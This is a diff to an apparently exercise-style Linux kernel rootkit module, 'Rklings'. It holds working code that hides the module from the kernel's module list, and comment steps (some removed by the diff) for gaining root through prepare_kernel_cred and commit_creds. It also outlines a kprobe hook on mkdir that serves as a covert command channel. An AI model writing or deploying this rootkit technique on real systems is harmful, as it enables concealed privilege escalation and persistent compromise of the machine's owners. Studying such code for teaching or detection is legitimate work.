@@ -10,52 +10,39 @@
 #include <linux/string.h>
 #include <linux/uaccess.h>
 
-#define RK_PREFIX "rkling."
-#define RK_PREFIX_LEN 7
+#define RK_PREFIX "rklings."
+#define RK_PREFIX_LEN 8
 #define RK_PATH_MAX 128
 
 static struct list_head *saved_prev;
-static bool cloaked;
+static bool module_hidden;
 static struct proc_dir_entry *proc_entry;
 
-static void rk_module_cloak(void)
+static void rk_module_hide(void)
 {
-	if (cloaked)
+	if (module_hidden)
 		return;
 	saved_prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-	cloaked = true;
+	module_hidden = true;
 }
 
-static void rk_module_uncloak(void)
+static void rk_module_unhide(void)
 {
-	if (!cloaked)
+	if (!module_hidden)
 		return;
 	list_add(&THIS_MODULE->list, saved_prev);
-	cloaked = false;
+	module_hidden = false;
 }
 
-// TODO: Implement rk_escalate()
-// Allocate new root credentials with prepare_kernel_cred(NULL)
-// Apply them with commit_creds()
-// Return 0 on success, -ENOMEM if allocation fails
+// TODO: rk_escalate (escalate current + parent)
 
-// TODO: Implement rk_parse_local_command(path)
-// path points past the initial prefix check
-// Match the command after "rkling.":
+// TODO: rk_parse_local_command(path) dispatch table:
 //   "e"   -> rk_escalate()
-//   "h.m" -> rk_module_cloak()
-//   "u.m" -> rk_module_uncloak()
-//   anything else -> return -ENOENT
+//   "h.m" -> rk_module_hide()
+//   "u.m" -> rk_module_unhide()
 
-// TODO: Implement rk_mkdir_pre(probe, regs)
-// Hook target is __x64_sys_mkdir(const struct pt_regs *uregs)
-// 1. Get inner pt_regs from argument 0, read pathname from uregs->di
-// 2. Copy the user path string with strncpy_from_user
-// 3. Check for "rkling." prefix, return 0 if not ours
-// 4. Call rk_parse_local_command with the path
-// 5. Set return value and call override_function_with_return
-// 6. Return 1 to skip the real mkdir
+// TODO: rk_mkdir_pre(probe, regs) kprobe pre_handler
 
 static struct kprobe mkdir_probe = {
 	.symbol_name = "__x64_sys_mkdir",
@@ -65,7 +52,7 @@ static struct kprobe mkdir_probe = {
 static int rk_show(struct seq_file *out, void *unused)
 {
 	(void)unused;
-	seq_printf(out, "module: %s\n", cloaked ? "hidden" : "visible");
+	seq_printf(out, "module: %s\n", module_hidden ? "hidden" : "visible");
 	return 0;
 }
 
@@ -81,15 +68,9 @@ static const struct proc_ops rk_proc_ops = {
 	.proc_release = single_release,
 };
 
-// TODO: Implement rk_init()
-// 1. Register mkdir kprobe
-// 2. Create /proc/rkling_status (0400)
-// Clean up on failure
+// TODO: rk_init (register kprobe, create /proc/rkling_status)
 
-// TODO: Implement rk_exit()
-// 1. Uncloak module
-// 2. Remove proc entry
-// 3. Unregister kprobe
+// TODO: rk_exit (unhide, remove proc, unregister kprobe)
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Rklings local covert control");
